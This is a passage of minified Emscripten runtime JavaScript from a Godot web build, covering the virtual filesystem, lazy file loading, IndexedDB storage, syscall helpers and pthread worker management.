0!==position;if(seeking){if(!stream.seekable)throw new FS.ErrnoError(70)}else position=stream.position;var bytesRead=stream.stream_ops.read(stream,buffer,offset,length,position);return seeking||(stream.position+=bytesRead),bytesRead},write:(stream,buffer,offset,length,position,canOwn)=>{if(length<0||position<0)throw new FS.ErrnoError(28);if(FS.isClosed(stream))throw new FS.ErrnoError(8);if(0==(2097155&stream.flags))throw new FS.ErrnoError(8);if(FS.isDir(stream.node.mode))throw new FS.ErrnoError(31);if(!stream.stream_ops.write)throw new FS.ErrnoError(28);stream.seekable&&1024&stream.flags&&FS.llseek(stream,0,2);var seeking=void 0!==position;if(seeking){if(!stream.seekable)throw new FS.ErrnoError(70)}else position=stream.position;var bytesWritten=stream.stream_ops.write(stream,buffer,offset,length,position,canOwn);return seeking||(stream.position+=bytesWritten),bytesWritten},allocate:(stream,offset,length)=>{if(FS.isClosed(stream))throw new FS.ErrnoError(8);if(offset<0||length<=0)throw new FS.ErrnoError(28);if(0==(2097155&stream.flags))throw new FS.ErrnoError(8);if(!FS.isFile(stream.node.mode)&&!FS.isDir(stream.node.mode))throw new FS.ErrnoError(43);if(!stream.stream_ops.allocate)throw new FS.ErrnoError(138);stream.stream_ops.allocate(stream,offset,length)},mmap:(stream,length,position,prot,flags)=>{if(0!=(2&prot)&&0==(2&flags)&&2!=(2097155&stream.flags))throw new FS.ErrnoError(2);if(1==(2097155&stream.flags))throw new FS.ErrnoError(2);if(!stream.stream_ops.mmap)throw new FS.ErrnoError(43);return stream.stream_ops.mmap(stream,length,position,prot,flags)},msync:(stream,buffer,offset,length,mmapFlags)=>stream&&stream.stream_ops.msync?stream.stream_ops.msync(stream,buffer,offset,length,mmapFlags):0,munmap:stream=>0,ioctl:(stream,cmd,arg)=>{if(!stream.stream_ops.ioctl)throw new FS.ErrnoError(59);return stream.stream_ops.ioctl(stream,cmd,arg)},readFile:(path,opts={})=>{if(opts.flags=opts.flags||0,opts.encoding=opts.encoding||"binary","utf8"!==opts.encoding&&"binary"!==opts.encoding)throw new Error('Invalid encoding type "'+opts.encoding+'"');var ret,stream=FS.open(path,opts.flags),length=FS.stat(path).size,buf=new Uint8Array(length);return FS.read(stream,buf,0,length,0),"utf8"===opts.encoding?ret=UTF8ArrayToString(buf,0):"binary"===opts.encoding&&(ret=buf),FS.close(stream),ret},writeFile:(path,data,opts={})=>{opts.flags=opts.flags||577;var stream=FS.open(path,opts.flags,opts.mode);if("string"==typeof data){var buf=new Uint8Array(lengthBytesUTF8(data)+1),actualNumBytes=stringToUTF8Array(data,buf,0,buf.length);FS.write(stream,buf,0,actualNumBytes,void 0,opts.canOwn)}else{if(!ArrayBuffer.isView(data))throw new Error("Unsupported data type");FS.write(stream,data,0,data.byteLength,void 0,opts.canOwn)}FS.close(stream)},cwd:()=>FS.currentPath,chdir:path=>{var lookup=FS.lookupPath(path,{follow:!0});if(null===lookup.node)throw new FS.ErrnoError(44);if(!FS.isDir(lookup.node.mode))throw new FS.ErrnoError(54);var errCode=FS.nodePermissions(lookup.node,"x");if(errCode)throw new FS.ErrnoError(errCode);FS.currentPath=lookup.path},createDefaultDirectories:()=>{FS.mkdir("/tmp"),FS.mkdir("/home"),FS.mkdir("/home/web_user")},createDefaultDevices:()=>{FS.mkdir("/dev"),FS.registerDevice(FS.makedev(1,3),{read:()=>0,write:(stream,buffer,offset,length,pos)=>length}),FS.mkdev("/dev/null",FS.makedev(1,3)),TTY.register(FS.makedev(5,0),TTY.default_tty_ops),TTY.register(FS.makedev(6,0),TTY.default_tty1_ops),FS.mkdev("/dev/tty",FS.makedev(5,0)),FS.mkdev("/dev/tty1",FS.makedev(6,0));var random_device=getRandomDevice();FS.createDevice("/dev","random",random_device),FS.createDevice("/dev","urandom",random_device),FS.mkdir("/dev/shm"),FS.mkdir("/dev/shm/tmp")},createSpecialDirectories:()=>{FS.mkdir("/proc");var proc_self=FS.mkdir("/proc/self");FS.mkdir("/proc/self/fd"),FS.mount({mount:()=>{var node=FS.createNode(proc_self,"fd",16895,73);return node.node_ops={lookup:(parent,name)=>{var fd=+name,stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);var ret={parent:null,mount:{mountpoint:"fake"},node_ops:{readlink:()=>stream.path}};return ret.parent=ret,ret}},node}},{},"/proc/self/fd")},createStandardStreams:()=>{Module.stdin?FS.createDevice("/dev","stdin",Module.stdin):FS.symlink("/dev/tty","/dev/stdin"),Module.stdout?FS.createDevice("/dev","stdout",null,Module.stdout):FS.symlink("/dev/tty","/dev/stdout"),Module.stderr?FS.createDevice("/dev","stderr",null,Module.stderr):FS.symlink("/dev/tty1","/dev/stderr");var stdin=FS.open("/dev/stdin",0),stdout=FS.open("/dev/stdout",1),stderr=FS.open("/dev/stderr",1);assert(0===stdin.fd,"invalid handle for stdin ("+stdin.fd+")"),assert(1===stdout.fd,"invalid handle for stdout ("+stdout.fd+")"),assert(2===stderr.fd,"invalid handle for stderr ("+stderr.fd+")")},ensureErrnoError:()=>{FS.ErrnoError||(FS.ErrnoError=function ErrnoError(errno,node){this.node=node,this.setErrno=function(errno){for(var key in this.errno=errno,ERRNO_CODES)if(ERRNO_CODES[key]===errno){this.code=key;break}},this.setErrno(errno),this.message=ERRNO_MESSAGES[errno],this.stack&&(Object.defineProperty(this,"stack",{value:(new Error).stack,writable:!0}),this.stack=demangleAll(this.stack))},FS.ErrnoError.prototype=new Error,FS.ErrnoError.prototype.constructor=FS.ErrnoError,[44].forEach((code=>{FS.genericErrors[code]=new FS.ErrnoError(code),FS.genericErrors[code].stack="<generic error, no stack>"})))},staticInit:()=>{FS.ensureErrnoError(),FS.nameTable=new Array(4096),FS.mount(MEMFS,{},"/"),FS.createDefaultDirectories(),FS.createDefaultDevices(),FS.createSpecialDirectories(),FS.filesystems={MEMFS:MEMFS,IDBFS:IDBFS}},init:(input,output,error)=>{assert(!FS.init.initialized,"FS.init was previously called. If you want to initialize later with custom parameters, remove any earlier calls (note that one is automatically added to the generated code)"),FS.init.initialized=!0,FS.ensureErrnoError(),Module.stdin=input||Module.stdin,Module.stdout=output||Module.stdout,Module.stderr=error||Module.stderr,FS.createStandardStreams()},quit:()=>{FS.init.initialized=!1,_fflush(0);for(var i=0;i<FS.streams.length;i++){var stream=FS.streams[i];stream&&FS.close(stream)}},getMode:(canRead,canWrite)=>{var mode=0;return canRead&&(mode|=365),canWrite&&(mode|=146),mode},findObject:(path,dontResolveLastLink)=>{var ret=FS.analyzePath(path,dontResolveLastLink);return ret.exists?ret.object:null},analyzePath:(path,dontResolveLastLink)=>{try{path=(lookup=FS.lookupPath(path,{follow:!dontResolveLastLink})).path}catch(e){}var ret={isRoot:!1,exists:!1,error:0,name:null,path:null,object:null,parentExists:!1,parentPath:null,parentObject:null};try{var lookup=FS.lookupPath(path,{parent:!0});ret.parentExists=!0,ret.parentPath=lookup.path,ret.parentObject=lookup.node,ret.name=PATH.basename(path),lookup=FS.lookupPath(path,{follow:!dontResolveLastLink}),ret.exists=!0,ret.path=lookup.path,ret.object=lookup.node,ret.name=lookup.node.name,ret.isRoot="/"===lookup.path}catch(e){ret.error=e.errno}return ret},createPath:(parent,path,canRead,canWrite)=>{parent="string"==typeof parent?parent:FS.getPath(parent);for(var parts=path.split("/").reverse();parts.length;){var part=parts.pop();if(part){var current=PATH.join2(parent,part);try{FS.mkdir(current)}catch(e){}parent=current}}return current},createFile:(parent,name,properties,canRead,canWrite)=>{var path=PATH.join2("string"==typeof parent?parent:FS.getPath(parent),name),mode=FS.getMode(canRead,canWrite);return FS.create(path,mode)},createDataFile:(parent,name,data,canRead,canWrite,canOwn)=>{var path=name;parent&&(parent="string"==typeof parent?parent:FS.getPath(parent),path=name?PATH.join2(parent,name):parent);var mode=FS.getMode(canRead,canWrite),node=FS.create(path,mode);if(data){if("string"==typeof data){for(var arr=new Array(data.length),i=0,len=data.length;i<len;++i)arr[i]=data.charCodeAt(i);data=arr}FS.chmod(node,146|mode);var stream=FS.open(node,577);FS.write(stream,data,0,data.length,0,canOwn),FS.close(stream),FS.chmod(node,mode)}return node},createDevice:(parent,name,input,output)=>{var path=PATH.join2("string"==typeof parent?parent:FS.getPath(parent),name),mode=FS.getMode(!!input,!!output);FS.createDevice.major||(FS.createDevice.major=64);var dev=FS.makedev(FS.createDevice.major++,0);return FS.registerDevice(dev,{open:stream=>{stream.seekable=!1},close:stream=>{output&&output.buffer&&output.buffer.length&&output(10)},read:(stream,buffer,offset,length,pos)=>{for(var bytesRead=0,i=0;i<length;i++){var result;try{result=input()}catch(e){throw new FS.ErrnoError(29)}if(void 0===result&&0===bytesRead)throw new FS.ErrnoError(6);if(null==result)break;bytesRead++,buffer[offset+i]=result}return bytesRead&&(stream.node.timestamp=Date.now()),bytesRead},write:(stream,buffer,offset,length,pos)=>{for(var i=0;i<length;i++)try{output(buffer[offset+i])}catch(e){throw new FS.ErrnoError(29)}return length&&(stream.node.timestamp=Date.now()),i}}),FS.mkdev(path,mode,dev)},forceLoadFile:obj=>{if(obj.isDevice||obj.isFolder||obj.link||obj.contents)return!0;if("undefined"!=typeof XMLHttpRequest)throw new Error("Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread.");if(!read_)throw new Error("Cannot load without read() or XMLHttpRequest.");try{obj.contents=intArrayFromString(read_(obj.url),!0),obj.usedBytes=obj.contents.length}catch(e){throw new FS.ErrnoError(29)}},createLazyFile:(parent,name,url,canRead,canWrite)=>{function LazyUint8Array(){this.lengthKnown=!1,this.chunks=[]}if(LazyUint8Array.prototype.get=function LazyUint8Array_get(idx){if(!(idx>this.length-1||idx<0)){var chunkOffset=idx%this.chunkSize,chunkNum=idx/this.chunkSize|0;return this.getter(chunkNum)[chunkOffset]}},LazyUint8Array.prototype.setDataGetter=function LazyUint8Array_setDataGetter(getter){this.getter=getter},LazyUint8Array.prototype.cacheLength=function LazyUint8Array_cacheLength(){var xhr=new XMLHttpRequest;if(xhr.open("HEAD",url,!1),xhr.send(null),!(xhr.status>=200&&xhr.status<300||304===xhr.status))throw new Error("Couldn't load "+url+". Status: "+xhr.status);var header,datalength=Number(xhr.getResponseHeader("Content-length")),hasByteServing=(header=xhr.getResponseHeader("Accept-Ranges"))&&"bytes"===header,usesGzip=(header=xhr.getResponseHeader("Content-Encoding"))&&"gzip"===header,chunkSize=1048576;hasByteServing||(chunkSize=datalength);var lazyArray=this;lazyArray.setDataGetter((chunkNum=>{var start=chunkNum*chunkSize,end=(chunkNum+1)*chunkSize-1;if(end=Math.min(end,datalength-1),void 0===lazyArray.chunks[chunkNum]&&(lazyArray.chunks[chunkNum]=((from,to)=>{if(from>to)throw new Error("invalid range ("+from+", "+to+") or no bytes requested!");if(to>datalength-1)throw new Error("only "+datalength+" bytes available! programmer error!");var xhr=new XMLHttpRequest;if(xhr.open("GET",url,!1),datalength!==chunkSize&&xhr.setRequestHeader("Range","bytes="+from+"-"+to),xhr.responseType="arraybuffer",xhr.overrideMimeType&&xhr.overrideMimeType("text/plain; charset=x-user-defined"),xhr.send(null),!(xhr.status>=200&&xhr.status<300||304===xhr.status))throw new Error("Couldn't load "+url+". Status: "+xhr.status);return void 0!==xhr.response?new Uint8Array(xhr.response||[]):intArrayFromString(xhr.responseText||"",!0)})(start,end)),void 0===lazyArray.chunks[chunkNum])throw new Error("doXHR failed!");return lazyArray.chunks[chunkNum]})),!usesGzip&&datalength||(chunkSize=datalength=1,datalength=this.getter(0).length,chunkSize=datalength,out("LazyFiles on gzip forces download of the whole file when length is accessed")),this._length=datalength,this._chunkSize=chunkSize,this.lengthKnown=!0},"undefined"!=typeof XMLHttpRequest){if(!ENVIRONMENT_IS_WORKER)throw"Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc";var lazyArray=new LazyUint8Array;Object.defineProperties(lazyArray,{length:{get:function(){return this.lengthKnown||this.cacheLength(),this._length}},chunkSize:{get:function(){return this.lengthKnown||this.cacheLength(),this._chunkSize}}});var properties={isDevice:!1,contents:lazyArray}}else properties={isDevice:!1,url:url};var node=FS.createFile(parent,name,properties,canRead,canWrite);properties.contents?node.contents=properties.contents:properties.url&&(node.contents=null,node.url=properties.url),Object.defineProperties(node,{usedBytes:{get:function(){return this.contents.length}}});var stream_ops={};function writeChunks(stream,buffer,offset,length,position){var contents=stream.node.contents;if(position>=contents.length)return 0;var size=Math.min(contents.length-position,length);if(assert(size>=0),contents.slice)for(var i=0;i<size;i++)buffer[offset+i]=contents[position+i];else for(i=0;i<size;i++)buffer[offset+i]=contents.get(position+i);return size}return Object.keys(node.stream_ops).forEach((key=>{var fn=node.stream_ops[key];stream_ops[key]=function forceLoadLazyFile(){return FS.forceLoadFile(node),fn.apply(null,arguments)}})),stream_ops.read=(stream,buffer,offset,length,position)=>(FS.forceLoadFile(node),writeChunks(stream,buffer,offset,length,position)),stream_ops.mmap=(stream,length,position,prot,flags)=>{FS.forceLoadFile(node);var ptr=mmapAlloc(length);if(!ptr)throw new FS.ErrnoError(48);return writeChunks(stream,GROWABLE_HEAP_I8(),ptr,length,position),{ptr:ptr,allocated:!0}},node.stream_ops=stream_ops,node},createPreloadedFile:(parent,name,url,canRead,canWrite,onload,onerror,dontCreateFile,canOwn,preFinish)=>{var fullname=name?PATH_FS.resolve(PATH.join2(parent,name)):parent,dep=getUniqueRunDependency("cp "+fullname);function processData(byteArray){function finish(byteArray){preFinish&&preFinish(),dontCreateFile||FS.createDataFile(parent,name,byteArray,canRead,canWrite,canOwn),onload&&onload(),removeRunDependency(dep)}Browser.handledByPreloadPlugin(byteArray,fullname,finish,(()=>{onerror&&onerror(),removeRunDependency(dep)}))||finish(byteArray)}addRunDependency(dep),"string"==typeof url?asyncLoad(url,(byteArray=>processData(byteArray)),onerror):processData(url)},indexedDB:()=>window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB,DB_NAME:()=>"EM_FS_"+window.location.pathname,DB_VERSION:20,DB_STORE_NAME:"FILE_DATA",saveFilesToDB:(paths,onload,onerror)=>{onload=onload||(()=>{}),onerror=onerror||(()=>{});var indexedDB=FS.indexedDB();try{var openRequest=indexedDB.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return onerror(e)}openRequest.onupgradeneeded=()=>{out("creating db"),openRequest.result.createObjectStore(FS.DB_STORE_NAME)},openRequest.onsuccess=()=>{var transaction=openRequest.result.transaction([FS.DB_STORE_NAME],"readwrite"),files=transaction.objectStore(FS.DB_STORE_NAME),ok=0,fail=0,total=paths.length;function finish(){0==fail?onload():onerror()}paths.forEach((path=>{var putRequest=files.put(FS.analyzePath(path).object.contents,path);putRequest.onsuccess=()=>{++ok+fail==total&&finish()},putRequest.onerror=()=>{fail++,ok+fail==total&&finish()}})),transaction.onerror=onerror},openRequest.onerror=onerror},loadFilesFromDB:(paths,onload,onerror)=>{onload=onload||(()=>{}),onerror=onerror||(()=>{});var indexedDB=FS.indexedDB();try{var openRequest=indexedDB.open(FS.DB_NAME(),FS.DB_VERSION)}catch(e){return onerror(e)}openRequest.onupgradeneeded=onerror,openRequest.onsuccess=()=>{var db=openRequest.result;try{var transaction=db.transaction([FS.DB_STORE_NAME],"readonly")}catch(e){return void onerror(e)}var files=transaction.objectStore(FS.DB_STORE_NAME),ok=0,fail=0,total=paths.length;function finish(){0==fail?onload():onerror()}paths.forEach((path=>{var getRequest=files.get(path);getRequest.onsuccess=()=>{FS.analyzePath(path).exists&&FS.unlink(path),FS.createDataFile(PATH.dirname(path),PATH.basename(path),getRequest.result,!0,!0,!0),++ok+fail==total&&finish()},getRequest.onerror=()=>{fail++,ok+fail==total&&finish()}})),transaction.onerror=onerror},openRequest.onerror=onerror},absolutePath:()=>{abort("FS.absolutePath has been removed; use PATH_FS.resolve instead")},createFolder:()=>{abort("FS.createFolder has been removed; use FS.mkdir instead")},createLink:()=>{abort("FS.createLink has been removed; use FS.symlink instead")},joinPath:()=>{abort("FS.joinPath has been removed; use PATH.join instead")},mmapAlloc:()=>{abort("FS.mmapAlloc has been replaced by the top level function mmapAlloc")},standardizePath:()=>{abort("FS.standardizePath has been removed; use PATH.normalize instead")}},SYSCALLS={DEFAULT_POLLMASK:5,calculateAt:function(dirfd,path,allowEmpty){if(PATH.isAbs(path))return path;var dir;if(-100===dirfd)dir=FS.cwd();else{var dirstream=FS.getStream(dirfd);if(!dirstream)throw new FS.ErrnoError(8);dir=dirstream.path}if(0==path.length){if(!allowEmpty)throw new FS.ErrnoError(44);return dir}return PATH.join2(dir,path)},doStat:function(func,path,buf){try{var stat=func(path)}catch(e){if(e&&e.node&&PATH.normalize(path)!==PATH.normalize(FS.getPath(e.node)))return-54;throw e}return GROWABLE_HEAP_I32()[buf>>2]=stat.dev,GROWABLE_HEAP_I32()[buf+8>>2]=stat.ino,GROWABLE_HEAP_I32()[buf+12>>2]=stat.mode,GROWABLE_HEAP_I32()[buf+16>>2]=stat.nlink,GROWABLE_HEAP_I32()[buf+20>>2]=stat.uid,GROWABLE_HEAP_I32()[buf+24>>2]=stat.gid,GROWABLE_HEAP_I32()[buf+28>>2]=stat.rdev,tempI64=[stat.size>>>0,(tempDouble=stat.size,+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[buf+40>>2]=tempI64[0],GROWABLE_HEAP_I32()[buf+44>>2]=tempI64[1],GROWABLE_HEAP_I32()[buf+48>>2]=4096,GROWABLE_HEAP_I32()[buf+52>>2]=stat.blocks,tempI64=[Math.floor(stat.atime.getTime()/1e3)>>>0,(tempDouble=Math.floor(stat.atime.getTime()/1e3),+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[buf+56>>2]=tempI64[0],GROWABLE_HEAP_I32()[buf+60>>2]=tempI64[1],GROWABLE_HEAP_I32()[buf+64>>2]=0,tempI64=[Math.floor(stat.mtime.getTime()/1e3)>>>0,(tempDouble=Math.floor(stat.mtime.getTime()/1e3),+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[buf+72>>2]=tempI64[0],GROWABLE_HEAP_I32()[buf+76>>2]=tempI64[1],GROWABLE_HEAP_I32()[buf+80>>2]=0,tempI64=[Math.floor(stat.ctime.getTime()/1e3)>>>0,(tempDouble=Math.floor(stat.ctime.getTime()/1e3),+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[buf+88>>2]=tempI64[0],GROWABLE_HEAP_I32()[buf+92>>2]=tempI64[1],GROWABLE_HEAP_I32()[buf+96>>2]=0,tempI64=[stat.ino>>>0,(tempDouble=stat.ino,+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[buf+104>>2]=tempI64[0],GROWABLE_HEAP_I32()[buf+108>>2]=tempI64[1],0},doMsync:function(addr,stream,len,flags,offset){var buffer=GROWABLE_HEAP_U8().slice(addr,addr+len);FS.msync(stream,buffer,offset,len,flags)},varargs:void 0,get:function(){return assert(null!=SYSCALLS.varargs),SYSCALLS.varargs+=4,GROWABLE_HEAP_I32()[SYSCALLS.varargs-4>>2]},getStr:function(ptr){return UTF8ToString(ptr)},getStreamFromFD:function(fd){var stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);return stream}};function _proc_exit(code){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(1,1,code);EXITSTATUS=code,keepRuntimeAlive()||(PThread.terminateAllThreads(),Module.onExit&&Module.onExit(code),ABORT=!0),quit_(code,new ExitStatus(code))}function exitJS(status,implicit){if(EXITSTATUS=status,!implicit&&ENVIRONMENT_IS_PTHREAD)throw exitOnMainThread(status),"unwind";if(keepRuntimeAlive()||exitRuntime(),keepRuntimeAlive()&&!implicit){var msg="program exited (with status: "+status+"), but keepRuntimeAlive() is set (counter="+runtimeKeepaliveCounter+") due to an async operation, so halting execution but not exiting the runtime or preventing further async execution (you can use emscripten_force_exit, if you want to force a true shutdown)";readyPromiseReject(msg),err(msg)}_proc_exit(status)}var _exit=exitJS;function ptrToString(ptr){return"0x"+ptr.toString(16).padStart(8,"0")}function handleException(e){if(e instanceof ExitStatus||"unwind"==e)return EXITSTATUS;quit_(1,e)}var PThread={unusedWorkers:[],runningWorkers:[],tlsInitFunctions:[],pthreads:{},init:function(){ENVIRONMENT_IS_PTHREAD?PThread.initWorker():PThread.initMainThread()},initMainThread:function(){for(var i=0;i<8;++i)PThread.allocateUnusedWorker()},initWorker:function(){noExitRuntime=!1},setExitStatus:function(status){EXITSTATUS=status},terminateAllThreads:function(){for(var t in assert(!ENVIRONMENT_IS_PTHREAD,"Internal Error! terminateAllThreads() can only ever be called from main application thread!"),PThread.pthreads){(worker=PThread.pthreads[t])&&PThread.returnWorkerToPool(worker)}assert(0===Object.keys(PThread.pthreads).length),assert(0===PThread.runningWorkers.length);for(var i=0;i<PThread.unusedWorkers.length;++i){var worker;assert(!(worker=PThread.unusedWorkers[i]).pthread_ptr),worker.terminate()}PThread.unusedWorkers=[]},returnWorkerToPool:function(worker){var pthread_ptr=worker.pthread_ptr;delete PThread.pthreads[pthread_ptr],PThread.unusedWorkers.push(worker),PThread.runningWorkers.splice(PThread.runningWorkers.indexOf(worker),1),worker.pthread_ptr=0,__emscripten_thread_free_data(pthread_ptr)},receiveObjectTransfer:function(data){},threadInitTLS:function(){for(var i in PThread.tlsInitFunctions)PThread.tlsInitFunctions.hasOwnProperty(i)&&PThread.tlsInitFunctions[i]()},loadWasmModuleToWorker:function(worker,onFinishedLoading){worker.onmessage=e=>{var d=e.data,cmd=d.cmd;if(worker.pthread_ptr&&(PThread.currentProxiedOperationCallerThread=worker.pthread_ptr),d.targetThread&&d.targetThread!=_pthread_self()){var targetWorker=PThread.pthreads[d.targetThread];return targetWorker?targetWorker.postMessage(d,d.transferList):err('Internal error! Worker sent a message "'+cmd+'" to target pthread '+d.targetThread+", but that thread no longer exists!"),void(PThread.currentProxiedOperationCallerThread=void 0)}"processProxyingQueue"===cmd?executeNotifiedProxyingQueue(d.queue):"spawnThread"===cmd?spawnThread(d):"cleanupThread"===cmd?cleanupThread(d.thread):"killThread"===cmd?killThread(d.thread):"cancelThread"===cmd?cancelThread(d.thread):"loaded"===cmd?(worker.loaded=!0,onFinishedLoading&&onFinishedLoading(worker),worker.runPthread&&(worker.runPthread(),delete worker.runPthread)):"print"===cmd?out("Thread "+d.threadId+": "+d.text):"printErr"===cmd?err("Thread "+d.threadId+": "+d.text):"alert"===cmd?alert("Thread "+d.threadId+": "+d.text):"setimmediate"===d.target?worker.postMessage(d):"onAbort"===cmd?Module.onAbort&&Module.onAbort(d.arg):cmd&&err("worker sent an unknown command "+cmd),PThread.currentProxiedOperationCallerThread=void 0},worker.onerror=e=>{var message="worker sent an error!";throw worker.pthread_ptr&&(message="Pthread "+ptrToString(worker.pthread_ptr)+" sent an error!"),err(message+" "+e.filename+":"+e.lineno+": "+e.message),e},assert(wasmMemory instanceof WebAssembly.Memory,"WebAssembly memory should have been loaded by now!"),assert(wasmModule instanceof WebAssembly.Module,"WebAssembly Module should have been loaded by now!"),worker.postMessage({cmd:"load",urlOrBlob:Module.mainScriptUrlOrBlob||_scriptDir,wasmMemory:wasmMemory,wasmModule:wasmModule})},allocateUnusedWorker:function(){var pthreadMainJs=locateFile("godot.web.template_release.wasm32.worker.js");PThread.unusedWorkers.push(new Worker(pthreadMainJs))},getNewWorker:function(){return 0==PThread.unusedWorkers.length&&(err("Tried to spawn a new thread, but the thread pool is exhausted.\nThis might result in a deadlock unless some threads eventually exit or the code explicitly breaks out to the event loop.\nIf you want to increase the pool size, use setting `-sPTHREAD_POOL_SIZE=...`.\nIf you want to throw an explicit error instead of the risk of deadlocking in those cases, use setting `-sPTHREAD_POOL_SIZE_STRICT=2`."),PThread.allocateUnusedWorker(),PThread.loadWasmModuleToWorker(PThread.unusedWorkers[0])),PThread.unusedWorkers.pop()}};function callRuntimeCallbacks(callbacks){for(;callbacks.length>0;)callbacks.shift()(Module)}function withStackSave(f){var stack=stackSave(),ret=f();return stackRestore(stack),ret}function demangle(func){return warnOnce("warning: build with -sDEMANGLE_SUPPORT to link in libcxxabi demangling"),func}function demangleAll(text){return text.replace(/\b_Z[\w\d_]+/g,(function(x){var y=demangle(x);return x===y?x:y+" ["+x+"]"}))}function establishStackSpace(){var pthread_ptr=_pthread_self(),stackTop=GROWABLE_HEAP_I32()[pthread_ptr+44>>2],stackMax=stackTop-GROWABLE_HEAP_I32()[pthread_ptr+48>>2];assert(0!=stackTop),assert(0!=stackMax),assert(stackTop>stackMax,"stackTop must be higher then stackMax"),_emscripten_stack_set_limits(stackTop,stackMax),stackRestore(stackTop),writeStackCookie()}function exitOnMainThread(returnCode){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(2,0,returnCode);try{_exit(returnCode)}catch(e){handleException(e)}}function getValue(ptr,type="i8"){switch(type.endsWith("*")&&(type="*"),type){case"i1":case"i8":return GROWABLE_HEAP_I8()[ptr>>0];case"i16":return GROWABLE_HEAP_I16()[ptr>>1];case"i32":case"i64":return GROWABLE_HEAP_I32()[ptr>>2];case"float":return GROWABLE_HEAP_F32()[ptr>>2];case"double":return GROWABLE_HEAP_F64()[ptr>>3];case"*":return GROWABLE_HEAP_U32()[ptr>>2];default:abort("invalid type for getValue: "+type)}return null}Module.PThread=PThread,Module.establishStackSpace=establishStackSpace;var wasmTableMirror=[];function getWasmTableEntry(funcPtr){var func=wasmTableMirror[funcPtr];return func||(funcPtr>=wasmTableMirror.length&&(wasmTableMirror.length=funcPtr+1),wasmTableMirror[funcPtr]=func=wasmTable.get(funcPtr)),assert(wasmTable.get(funcPtr)==func,"JavaScript-side Wasm function table mirror is out of date!"),func}function invokeEntryPoint(ptr,arg){var result=getWasmTableEntry(ptr)(arg);checkStackCookie(),keepRuntimeAlive()?PThread.setExitStatus(result):__emscripten_thread_exit(result)}function jsStackTrace(){var error=new Error;if(!error.stack){try{throw new Error}catch(e){error=e}if(!error.stack)return"(no stack trace available)"}return error.stack.toString()}function registerTLSInit(tlsInitFunc){PThread.tlsInitFunctions.push(tlsInitFunc)}function setValue(ptr,value,type="i8"){switch(type.endsWith("*")&&(type="*"),type){case"i1":case"i8":GROWABLE_HEAP_I8()[ptr>>0]=value;break;case"i16":GROWABLE_HEAP_I16()[ptr>>1]=value;break;case"i32":GROWABLE_HEAP_I32()[ptr>>2]=value;break;case"i64":tempI64=[value>>>0,(tempDouble=value,+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[ptr>>2]=tempI64[0],GROWABLE_HEAP_I32()[ptr+4>>2]=tempI64[1];break;case"float":GROWABLE_HEAP_F32()[ptr>>2]=value;break;case"double":GROWABLE_HEAP_F64()[ptr>>3]=value;break;case"*":GROWABLE_HEAP_U32()[ptr>>2]=value;break;default:abort("invalid type for setValue: "+type)}}function stackTrace(){var js=jsStackTrace();return Module.extraStackTrace&&(js+="\n"+Module.extraStackTrace()),demangleAll(js)}function writeArrayToMemory(array,buffer){assert(array.length>=0,"writeArrayToMemory array must have a length (should be an array or typed array)"),GROWABLE_HEAP_I8().set(array,buffer)}function ___assert_fail(condition,filename,line,func){abort("Assertion failed: "+UTF8ToString(condition)+", at: "+[filename?UTF8ToString(filename):"unknown filename",line,func?UTF8ToString(func):"unknown function"])}function ___call_sighandler(fp,sig){getWasmTableEntry(fp)(sig)}function ___emscripten_init_main_thread_js(tb){__emscripten_thread_init(tb,!ENVIRONMENT_IS_WORKER,1,!ENVIRONMENT_IS_WEB),PThread.threadInitTLS()}function ___emscripten_thread_cleanup(thread){ENVIRONMENT_IS_PTHREAD?postMessage({cmd:"cleanupThread",thread:thread}):cleanupThread(thread)}function pthreadCreateProxied(pthread_ptr,attr,start_routine,arg){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(3,1,pthread_ptr,attr,start_routine,arg):___pthread_create_js(pthread_ptr,attr,start_routine,arg)}function ___pthread_create_js(pthread_ptr,attr,start_routine,arg){if("undefined"==typeof SharedArrayBuffer)return err("Current environment does not support SharedArrayBuffer, pthreads are not available!"),6;var transferList=[];if(ENVIRONMENT_IS_PTHREAD&&0===transferList.length)return pthreadCreateProxied(pthread_ptr,attr,start_routine,arg);var threadParams={startRoutine:start_routine,pthread_ptr:pthread_ptr,arg:arg,transferList:transferList};return ENVIRONMENT_IS_PTHREAD?(threadParams.cmd="spawnThread",postMessage(threadParams,transferList),0):spawnThread(threadParams)}function ___syscall__newselect(nfds,readfds,writefds,exceptfds,timeout){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(4,1,nfds,readfds,writefds,exceptfds,timeout);try{assert(nfds<=64,"nfds must be less than or equal to 64"),assert(!exceptfds,"exceptfds not 